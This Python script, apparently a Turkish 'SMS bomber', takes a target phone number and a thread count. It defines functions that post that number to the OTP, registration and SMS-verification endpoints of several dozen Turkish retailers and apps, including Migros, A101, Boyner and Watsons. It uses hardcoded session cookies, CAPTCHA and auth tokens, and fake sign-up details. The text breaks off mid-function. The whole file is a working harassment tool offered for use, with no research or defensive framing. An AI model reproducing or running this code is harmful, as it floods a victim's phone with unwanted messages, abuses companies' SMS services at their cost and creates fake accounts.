import requests
import time
import os
import threading
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style

os.system('color')
os.system('cls')

print('''
                                                       YCB=CSAG
                                               YCB olunmaz YCB doğulur
                                                                                                                                                                                                                                                                                              
developed by YCB

''')

numara = int(input("Numarayı giriniz (+90) olmadan: "))
threadsayi = int(input("Hız (500): "))
mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"

    # dsmartgo.com.tr
def Dsmartgo(phone):
    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        "IsSubscriber": "true",
        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        "Mobile": phone,
    }, cookies={
            "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
            "_ga": "GA1.3.1016548678.1638216163",
            "_gat": "1",
            "_gat_gtag_UA_18913632_14": "1",
            "_gid": "GA1.3.1214889554.1638216163",
            "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
            "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        })
    try:
        BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
    except AttributeError:
        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr")
        
    

# kigili.com
def Kigili(phone, eposta):    
    try:
        kigili = requests.post("https://www.kigili.com/users/registration/", data={
            "first_name": "Memati",
            "last_name": "Bas",
            "email": eposta,
            "phone": f"0{phone}",
            "password": "31ABC..abc31",
            "confirm": "true",
            "kvkk": "true",
            "next": ""
        })
        if kigili.status_code == 202:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com")
    

#kahvedunyasi.com
def KahveDunyasi(numara):    
    try:    
        # kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
        #     "mobile_number": phone,
        #     "token_type": "register_token"
        # })
        data = {
            "mobile_number": numara,
            "token_type": "register_token"
        }

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "tr-TR,tr;q=0.7",
            "Connection": "keep-alive",
            "Content-Length": "60",
            "Content-Type": "application/json;charset=UTF-8",
            "Guest-Token": "dPiNQ3wjPJubH37JNpoq93s3T2qQ4VUfVhsWjMJe",
            "Host": "core.kahvedunyasi.com",
            "Origin": "https://www.kahvedunyasi.com",
            "page-url": "/kayit-ol",
            "Positive-Client": "kahvedunyasi",
            "Positive-Client-Type": "web",
            "Referer": "https://www.kahvedunyasi.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "Sec-GPC": "1",
            "store-id": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
        }
        kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", json=data, headers=headers)
        if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com")
            
        else:
            raise
    except:    
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com")
    

#naosstars.com
def NaosStars(phone, eposta):
    try:
        naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
            "email": eposta,
            "first_name": "Memati",
            "last_name": "Bas",
            "password": "31ABC..abc31",
            "date_of_birth": "1975-12-31",
            "phone": f"0{phone}",
            "gender": "male",
            "kvkk": "true",
            "contact": "true",
            "confirm": "true"
        })
        if naosstars.status_code == 202:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com")
             
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com")
        
    
#wmf.com.tr
def Wmf(phone, eposta):
    try:
        wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
            "confirm": "true",
            "date_of_birth": "1956-03-01",
            "email": eposta,
            "email_allowed": "true",
            "first_name": "Memati",
            "gender": "male",
            "last_name": "Bas",
            "password": "31ABC..abc31",
            "phone": f"0{phone}"
        })
        if wmf.status_code == 202:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr")
               
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr")
        

#istegelsin.com
def IsteGelsin(phone):
    try:
        json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(phone)}}
        r = requests.post("https://prod.fasapi.net:443/",  json=json)
        if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> prod.fasapi.net")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> prod.fasapi.net")


#bim
def Bim(phone):
    try:
        bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": phone})
        if bim.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net")
        
    
#ceptesok.com
def Sok(phone):
    try:
        r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": phone, "token_type": "register_token"})
        if len(r.json()["meta"]["messages"]["success"]) != 0:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.ceptesok.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com")
        

#tiklagelsin.com
def Tiklagelsin(numara):
    try:
        data = {
            "operationName": "GENERATE_OTP",
            "variables": {
                "phone": f"+90{numara}",
                "challenge": "66f4f3a8-3eec-40c8-a240-578d03a6ce4e",
                "deviceUniqueId": "web_1e4ad091-cbb2-46e6-8dd1-acd8b482c67f"
            },
            "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
        }

        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "tr-TR,tr;q=0.6",
            "content-length": "385",
            "content-type": "application/json",
            "origin": "https://www.tiklagelsin.com",
            "referer": "https://www.tiklagelsin.com/a/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "x-device-type": "3",
            "x-merchant-type": "0",
            "x-no-auth": "true"
        }
        tiklagelsin = requests.post("https://www.tiklagelsin.com/user/graphql", json=data, headers=headers)
        if tiklagelsin.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> www.tiklagelsin.com")
            
        else:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> www.tiklagelsin.com")
    except:
        raise
        

#migros.com.tr
def Migros(numara):
    try:
        # migros = requests.post("https://www.migros.com.tr/rest/users/login/otp?reid=1673121724845000041",  json={"phoneNumber": phone})
        data = {
            "phoneNumber": f"{numara}"
        }

        headers = {
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "tr-TR,tr",
            "content-length": "28",
            "content-type": "application/json",
            "cookie": "cookieSettings=%7B%22indicatorSeen%22%3Afalse%2C%22analyseCookies%22%3Afalse%2C%22marketingCookies%22%3Afalse%2C%22systemCookies%22%3Afalse%7D; VSTR_ID=dd41e4cb-6366-4dd5-b3cd-930dcc0400d7; CLIENT_SESSION_ID=12e810ba-32f5-4e63-861b-fb1e3bde583a",
            "origin": "https://www.migros.com.tr",
            "referer": "https://www.migros.com.tr/giris",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-gpc": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "x-forwarded-rest": "true",
            "x-pwa": "true"
        }
        migros = requests.post("https://www.migros.com.tr/rest/users/login/otp?reid=1673121724845000041", json=data, headers=headers)
        if migros.json()["successful"] == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rest.sanalmarket.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rest.sanalmarket.com.tr")
        

#a101.com.tr
def A101(phone):
    try:
        url = "https://www.a101.com.tr:443/users/otp-login/"
        data = {"phone": f"0{phone}", "next": "/a101-kapida"}
        r = requests.post(url,data=data)
        if (r.status_code) == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr")
            
        else:
            raise 
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr")


#englishhome.com
def Englishhome(phone, eposta):
    try:
        data = {"first_name": "Memati", "last_name": "Bas", "email": eposta, "phone": f"0{phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
        home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
        if home.status_code == 202:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com")
        
        
#sakasu.com.tr
def Sakasu(phone):
    try:
        data = {"phone": phone}
        su = requests.post("https://sakasu.com.tr/app/api_register/step1", data=data)
        if su.json()["status"] == "ok":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr")
        

#rentiva.com
def Rentiva(phone): 
    try:
        url = "https://rentiva.com:443/api/Account/Login"
        headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
        json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": phone, "type": 1}
        rentiva = requests.post(url, headers=headers, json=json)
        if rentiva.json()["success"] == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com")
        

#bineq.tech
def Bineq(phone):
    try:
        url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={phone}"
        headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
        bineq = requests.post(url, headers=headers)
        if bineq.json()["IsSuccess"] == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bineqapi.heymobility.tech")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineqapi.heymobility.tech")
        
        
#superpedestrian.com
def Link(phone):
    try:
        url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
        json={"phone_number": f"+90{phone}"}
        link = requests.post(url, json=json)
        if link.json()["detail"] == "Ok":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> consumer-auth.linkfleet.de")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> consumer-auth.linkfleet.de")

        
#loncamarket.com
def Lonca(phone):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
        json={"Address": phone, "ConfirmationType": 0}
        lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
        if lonca.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> loncamarket.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> loncamarket.com")   
        

#dgnonline.com
def Dgn(phone):
    try:
        url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
        data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": phone}
        dgn = requests.post(url, headers=headers, data=data)
        if dgn.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> odeme.dgnonline.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> odeme.dgnonline.com")  
        

#yaanimail.com
def Yaani(phone, eposta):
    try:
        url = "https://api.yaanimail.com:443/gateway/v1/accounts/verification-code/send"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Content-Type": "application/json"}
        json={"action": "create", "email": f"{eposta}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": eposta}, {"type": "msisdn", "value": f"90{phone}"}]}
        r = requests.post(url, headers=headers, json=json)
        if r.status_code == 204:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.yaanimail.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.yaanimail.com")  
        
            
#defacto.com.tr
def Defacto(phone):
    try:
        url = "https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.defacto.com.tr/Login?newUser=True&ReturnUrl=%2FCustomer%2FSendPhoneConfirmationSms", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.defacto.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
        data = {"mobilePhone": phone}
        r = requests.post(url, headers=headers, data=data)
        if r.json()["Data"]["IsSMSSend"] == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> defacto.com.tr")


#mopas.com.tr
def Mopas(phone):
    try:
        r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={phone}&pwd=&checkPwd=")
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mopas.com.tr")
        

#icq.net
def Icq(phone):
    try:
        url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
        json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{phone}", "route": "sms"}, "reqId": "25299-1669396271"}
        r = requests.post(url, headers=headers, json=json)
        if r.json()["status"]["code"] == 20000:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> u.icq.net")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> u.icq.net")
        

#boyner.com
def Boyner(phone, eposta):
    try:
        url = "https://www.boyner.com.tr:443/v2/customerV2/Register"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.boyner.com.tr/uyelik?type=uye-ol", "X-Newrelic-Id": "Vg8GVlZWCBACUFVRAwkEUFY=", "Newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjI5MTcwNTAiLCJhcCI6IjMyMjUzNjA4MiIsImlkIjoiODE3YTIyZTZhODQ0OTJlNCIsInRyIjoiMTM0MWRkZThjZWVmMTExMjQ3MGE4NDQ2M2I1YWU4NzgiLCJ0aSI6MTY3MDU1MzA1OTMzNn19", "Traceparent": "00-1341dde8ceef1112470a84463b5ae878-817a22e6a84492e4-01", "Tracestate": "2917050@nr=0-1-2917050-322536082-817a22e6a84492e4----1670553059336", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.boyner.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
        json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": phone, "day": "31", "Email": eposta, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
        r = requests.post(url, headers=headers, json=json)
        if r.json()["Success"] == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> boyner.com")
        

#watsons.com.tr
def Watsons(phone):
    try:
        url = "https://www.watsons.com.tr:443/api/v2/wtctr/phone-verification/phonenumber?lang=tr_TR"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "https://www.watsons.com.tr/register", "Content-Type": "application/json;charset=UTF-8", "X-Dtpc": "11$208941126_619h150vEGITDHTLQJAGKPKRHUIMTILDMPAWJTOL-0e0", "Origin": "https://www.watsons.com.tr", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Pragma": "no-cache", "Cache-Control": "no-cache", "Te": "trailers"}
        json={"countryCode": "TR", "phoneNumber": phone}
        r = requests.post(url, headers=headers, json=json)
        if r.status_code == 201:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> watsons.com.tr")
        

#buyursungelsin.com
def Buyur(phone):
    try:
        url = "https://app.buyursungelsin.com:443/api/customer/form/check"
        headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M", "Accept-Encoding": "gzip, deflate", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Gelsinapp/30 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9"}
        data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{phone}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
        r = requests.post(url, headers=headers, data=data)
        if (r.status_code) == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.buyursungelsin.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.buyursungelsin.com")
        

#idealdata.com.tr
def Osmanlideal(phone, eposta):
    try:
        r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{eposta}%020{phone}")
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> osmgck.idealdata.com.tr")
        

#pinarsu.com.tr
def Pinar(phone):
    try:
        url = "https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp"
        headers = {"Content-Type": "application/json", "Devicetype": "ios", "Accept": "*/*", "Authorization": "bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Level": "40202", "Accountid": "062511D3-BF52-4441-A29B-8250E3900931", "Accept-Encoding": "gzip, deflate", "User-Agent": "Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2", "Languageid": "D4FF115D-1AB5-4141-8719-A102C3CF9F1E", "Connection": "close"}
        json={"MobilePhone": phone}
        r = requests.post(url, headers=headers, json=json)
        if r.text == "true":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pinarsumobileservice.yasar.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> pinarsumobileservice.yasar.com.tr")
        

#suiste.com
def Suiste(phone):
    try:
        url = "https://suiste.com:443/api/auth/code"
        headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
        data = {"action": "register", "gsm": phone}
        r = requests.post(url, headers=headers, data=data)
        if r.json()["code"] == "common.success":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suiste.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> suiste.com")
        
        
#hayatsu.com.tr
def Hayat(phone):
    try:
        url = "https://www.hayatsu.com.tr:443/api/signup/otpsend"
        json={"mobilePhoneNumber": phone}
        r = requests.post(url, json=json)
        if (r.json()["IsSuccessful"]) == True:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hayatsu.com.tr")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> hayatsu.com.tr")
        
        
#pisir.com
def Pisir(phone):
    try:
        r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": phone})
        if r.json()["ok"] == "1":
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.pisir.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.pisir.com")
            

#KimGbIster
def KimGb(phone):
    try:
        r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{phone}"})
        if r.status_code == 200:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
            
        else:
            raise
    except:
        print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")


#ikinciyeni.com
def IkinciYeni(phone, eposta):
    try:
        url = "https://apigw.ikinciyeni.com:443/RegisterRequest"
